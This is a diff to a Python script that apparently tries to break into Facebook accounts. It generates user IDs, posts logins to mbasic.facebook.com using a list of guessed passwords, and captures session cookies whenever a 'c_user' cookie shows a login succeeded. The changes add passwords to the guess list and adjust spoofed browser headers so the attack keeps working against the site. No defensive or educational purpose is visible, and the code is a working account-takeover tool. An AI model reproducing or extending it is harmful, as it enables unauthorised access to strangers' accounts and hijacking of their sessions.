@@ -330,7 +330,7 @@ def bd():
         print('\033[1;97m─────────────────────────────────────────────────────')
         for love in user:
             uid = code+love
-            pwx = [love,'bangladesh','Bangladesh']
+            pwx = [love,'bangladesh','Bangladesh','sadiya','nusrat',]
             manshera.submit(hot,uid,pwx,tl)
     print('')
     print('\033[1;97m─────────────────────────────────────────────────────')
@@ -638,7 +638,7 @@ def sexy(uid,pwx,tl):
         for ps in pwx:
             session = requests.Session()
             pro = random.choice(ugen)
-            free_fb = session.get('https://x.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -649,7 +649,7 @@ def sexy(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
             'path': '/?_rdc=1&_rdr',
             'scheme': 'https',
@@ -657,6 +657,7 @@ def sexy(uid,pwx,tl):
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'dpr': '2.200000047683716',
+            'referer': 'https://mbasic.facebook.com/',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
             'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
@@ -666,13 +667,13 @@ def sexy(uid,pwx,tl):
             'sec-ch-ua-platform-version': '"12.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
+            'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',
 }
-            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
